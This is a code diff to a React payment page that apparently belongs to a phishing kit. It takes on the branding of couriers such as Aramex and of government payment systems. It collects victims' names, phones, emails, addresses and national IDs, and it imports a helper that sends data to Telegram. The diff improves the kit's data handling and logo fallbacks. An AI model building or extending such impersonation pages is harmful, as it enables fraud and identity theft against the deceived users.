@@ -5,13 +5,14 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { useUpdateLink } from "@/hooks/useSupabase";
+import { useLinkData } from "@/hooks/useLinkData";
 import { Loader2, User, Phone, Mail, MapPin, ArrowLeft, ShieldCheck, Globe, Lock, ChevronDown } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
-import { getGovBranding } from "@/lib/governmentPaymentSystems";
+import { getGovBranding } from "@/lib/brandingSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentRecipient = () => {
@@ -19,7 +20,7 @@ const PaymentRecipient = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
   const updateLink = useUpdateLink();
 
   const [name, setName] = useState("");
@@ -29,7 +30,7 @@ const PaymentRecipient = () => {
   const [nationalId, setNationalId] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
+  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || (linkData?.type === 'contracts' ? 'contracts' : 'aramex');
   const govId = searchParams.get("govId") || linkData?.payload?.govId;
   const branding = getServiceBranding(companyKey);
   const govBranding = govId ? getGovBranding(govId) : undefined;
@@ -64,7 +65,9 @@ const PaymentRecipient = () => {
     const customerInfo = { name, phone, email, address, nationalId };
 
     try {
-      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, customerInfo } });
+      if (id && id !== 'local') {
+        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, customerInfo } });
+      }
 
       // Netlify Form Submission
       await fetch("/", {
@@ -112,7 +115,7 @@ const PaymentRecipient = () => {
       <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: primaryColor }}>
          <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
             <div className="flex items-center gap-4">
-               <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
+               <img src={(isGov ? govBranding.logoUrl : branding.logo) || branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
                <div className="hidden md:block">
                   <h1 className="text-sm font-black text-gray-800 leading-none">{isGov ? govBranding.nameAr : branding.name}</h1>
                   <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">E-Services & Payment Gateway</p>
